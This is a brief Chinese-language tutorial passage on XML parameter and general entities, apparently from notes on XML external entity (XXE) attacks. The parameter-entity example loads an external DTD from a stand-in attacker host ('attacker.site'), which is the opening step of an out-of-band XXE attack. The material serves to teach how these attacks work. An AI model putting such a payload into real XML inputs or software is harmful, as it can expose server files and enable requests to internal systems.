
### 参数实体

以`%`开头，仅在DTD内部使用
```xml
<!-- dtd 声明 -->
<!DOCTYPE foo [<!ENTITY % ParameterEntityName SYSTEM
"http://attacker.site/attack.dtd"> %ParameterEntityName;]>
```

### 通用实体

无`%`前缀，在XML文档内容中引用`&name;`，用于文本替换
```xml
<!-- dtd 声明 -->
<!DOCTYPE foo [<!ENTITY GeneralEntityName "字符串">]>
<!-- xml 正文 -->
<foo>&GeneralEntityName;</foo>
```
